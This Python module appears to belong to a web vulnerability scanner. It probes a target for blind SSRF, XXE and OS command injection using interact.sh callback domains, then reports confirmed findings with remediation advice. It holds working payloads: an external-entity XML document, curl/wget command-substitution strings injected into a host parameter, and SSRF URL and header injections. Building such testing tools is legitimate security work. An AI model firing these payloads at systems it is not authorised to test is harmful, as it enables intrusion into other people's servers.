"""
OAST (Out-of-Band Application Security Testing) Module
Tests for Blind SSRF, Blind XXE, and Blind Command Injection by injecting
Interactsh payloads and monitoring for asynchronous DNS/HTTP callbacks.
"""

import re
import time
import requests
import json
import concurrent.futures
from urllib.parse import urljoin
from colorama import Fore, Style

class OASTTester:
    def __init__(self, session, base_url):
        self.session = session
        self.base_url = base_url
        self.findings = []
        
        # Interactsh public API infrastructure
        self.interactsh_server = "interact.sh"
        self.correlation_id = None
        self.secret_token = None
        self.payload = None
        
    def _register_interactsh(self):
        """Register a new ephemeral Interactsh payload domain."""
        try:
            # Generate a random correlation ID and secret token
            import uuid
            self.correlation_id = uuid.uuid4().hex[:20]
            self.secret_token = uuid.uuid4().hex[:20]
            
            headers = {
                "User-Agent": "PreFlight-Scanner-OAST",
                "Content-Type": "application/json"
            }
            data = {
                "correlation-id": self.correlation_id,
                "secret-key": self.secret_token
            }
            
            resp = requests.post(f"https://{self.interactsh_server}/register", json=data, headers=headers, timeout=10)
            if resp.status_code == 200:
                self.payload = f"{self.correlation_id}.{self.interactsh_server}"
                return True
            return False
        except Exception:
            return False
            
    def _poll_interactions(self):
        """Poll the interactsh server for out-of-band callbacks."""
        if not self.correlation_id:
            return []
            
        try:
            # Typically need to wait a few seconds for blind injections to fire and DNS to propagate
            time.sleep(3)
            url = f"https://{self.interactsh_server}/poll?id={self.correlation_id}&secret={self.secret_token}"
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                return data.get('data', [])
        except Exception:
            return []
        return []

    def run_all_checks(self):
        """Run Out-of-Band (Blind) vulnerability checks."""
        print(f"{Fore.CYAN}[*] Out-of-Band Application Security Testing (OAST){Style.RESET_ALL}")
        
        if not self._register_interactsh():
            print(f"{Fore.YELLOW}[!] Failed to register OAST payload server. Skipping blind tests.{Style.RESET_ALL}")
            return self.findings
            
        print(f"{Fore.GREEN}[+] Generated OAST Callback Payload: {self.payload}{Style.RESET_ALL}")
        
        # Launch injections
        self.test_blind_ssrf()
        self.test_blind_xxe()
        self.test_blind_os_command()
        
        # Wait and poll for asynchronous callbacks
        interactions = self._poll_interactions()
        self._analyze_callbacks(interactions)
        
        return self.findings

    def test_blind_ssrf(self):
        """Inject OAST payload into potential SSRF vectors."""
        print(f"{Fore.YELLOW}[*] Testing Blind SSRF vectors...{Style.RESET_ALL}")
        
        endpoints = ['/api/webhook', '/fetch', '/proxy', '/download', '/api/v1/import']
        params = ['url', 'uri', 'target', 'link', 'webhook', 'callback', 'ping']
        
        def test_endpoint(endpoint):
            url = urljoin(self.base_url, endpoint)
            for p in params:
                payload_url = f"http://{self.payload}/{p}"
                try:
                    # Test as GET
                    self.session.get(f"{url}?{p}={payload_url}", timeout=2)
                    # Test as POST JSON
                    self.session.post(url, json={p: payload_url}, timeout=2)
                except Exception:
                    pass

        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            executor.map(test_endpoint, endpoints)
            
        # Also test headers
        try:
            headers = {
                'Referer': f"http://{self.payload}/referer",
                'X-Forwarded-Host': self.payload,
                'Contact': f"root@{self.payload}"
            }
            self.session.get(self.base_url, headers=headers, timeout=2)
        except Exception:
            pass

    def test_blind_xxe(self):
        """Inject OAST payload into XML parsing endpoints to test for Blind XXE."""
        print(f"{Fore.YELLOW}[*] Testing Blind XXE vectors...{Style.RESET_ALL}")
        
        xxe_endpoints = ['/api/xml', '/upload', '/import', '/api/parse']
        xxe_payload = f"""<?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [
        <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "http://{self.payload}/xxe" >]>
        <foo>&xxe;</foo>"""
        
        for endpoint in xxe_endpoints:
            url = urljoin(self.base_url, endpoint)
            try:
                headers = {'Content-Type': 'application/xml'}
                self.session.post(url, data=xxe_payload, headers=headers, timeout=2)
            except Exception:
                pass

    def test_blind_os_command(self):
        """Inject OAST payload via command substitution to test for Blind OS Command Injection."""
        print(f"{Fore.YELLOW}[*] Testing Blind OS Command Injection vectors...{Style.RESET_ALL}")
        
        endpoints = ['/api/ping', '/tools/lookup', '/admin/system', '/api/health']
        cmd_payloads = [
            f"$(curl http://{self.payload}/cmd1)",
            f"`wget http://{self.payload}/cmd2`",
            f"; curl http://{self.payload}/cmd3 ;",
            f"ping -c 1 {self.payload}"
        ]
        
        for endpoint in endpoints:
            url = urljoin(self.base_url, endpoint)
            for payload in cmd_payloads:
                try:
                    self.session.get(f"{url}?host=127.0.0.1{payload}", timeout=2)
                    self.session.post(url, json={'host': f"127.0.0.1{payload}", 'ip': payload}, timeout=2)
                except Exception:
                    pass

    def _analyze_callbacks(self, interactions):
        """Analyze polled interactions to confirm blind vulnerabilities."""
        if not interactions:
            return
            
        ssrf_count = 0
        xxe_count = 0
        cmd_count = 0
        
        for interaction in interactions:
            protocol = interaction.get('protocol', 'UNKNOWN')
            qtype = interaction.get('q-type', '')
            raw_request = interaction.get('raw-request', '')
            
            # Determine vulnerability origin
            if '/xxe' in raw_request:
                xxe_count += 1
            elif '/cmd' in raw_request or 'ping' in raw_request:
                cmd_count += 1
            else:
                ssrf_count += 1

        if ssrf_count > 0:
            self.findings.append({
                'title': 'Blind Server-Side Request Forgery (SSRF) Confirmed',
                'description': f'Triggered {ssrf_count} out-of-band callbacks (HTTP/DNS) from target infrastructure',
                'severity': 'CRITICAL',
                'owasp': 'A10:2021',
                'api_owasp': 'API7:2023',
                'cwe': 'CWE-918',
                'remediation': 'Disable fetching of external URLs or strictly allowlist permitted domains. Filter out internal IPs and OAST domains.',
                'evidence': f'{ssrf_count} interactions received on OAST payload {self.payload}',
                'mitre_attack': 'T1190'
            })
            
        if xxe_count > 0:
            self.findings.append({
                'title': 'Blind XML External Entity (XXE) Confirmed',
                'description': f'Triggered {xxe_count} out-of-band callbacks via XML external entity evaluation',
                'severity': 'CRITICAL',
                'owasp': 'A03:2021',
                'cwe': 'CWE-611',
                'remediation': 'Disable external entity (XXE) and DTD processing in all XML parsers.',
                'evidence': f'XXE payload triggered interaction to {self.payload}/xxe',
                'mitre_attack': 'T1190'
            })
            
        if cmd_count > 0:
            self.findings.append({
                'title': 'Blind OS Command Injection Confirmed',
                'description': f'Triggered {cmd_count} out-of-band callbacks via shell evaluation',
                'severity': 'CRITICAL',
                'owasp': 'A03:2021',
                'cwe': 'CWE-78',
                'remediation': 'Never pass untrusted data to OS shells. Use parameterized APIs and strict input validation.',
                'evidence': f'Command injection payload triggered interaction to {self.payload}',
                'mitre_attack': 'T1059'
            })
